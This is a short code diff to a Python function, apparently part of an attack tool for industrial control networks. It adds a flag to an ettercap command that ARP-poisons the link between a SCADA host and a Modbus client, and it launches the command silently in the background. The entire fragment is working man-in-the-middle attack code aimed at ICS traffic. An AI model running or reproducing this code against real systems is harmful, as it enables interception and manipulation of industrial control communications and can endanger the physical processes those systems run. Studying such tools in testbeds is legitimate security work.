@@ -63,7 +63,7 @@ def etterspoof():
         intrfce = input("Enter Interface Name: ") 
         time.sleep(5)
 
-        cmd = ["ettercap", "-Tq", "-i", intrfce, "-M", f"arp:remote", f"{nm_config.scada_mac}/{nm_config.scada_ip}//", f"{nm_config.modcli_mac}/{nm_config.modcli_ip}//"]
+        cmd = ["ettercap", "-Tq", "-N", "-i", intrfce, "-M", f"arp:remote", f"{nm_config.scada_mac}/{nm_config.scada_ip}//", f"{nm_config.modcli_mac}/{nm_config.modcli_ip}//"]
         print(f"Executing: {' '.join(cmd)}")
         subprocess.Popen(cmd, stdout=subprocess.DEVNULL, start_new_session=True)
         time.sleep(5)
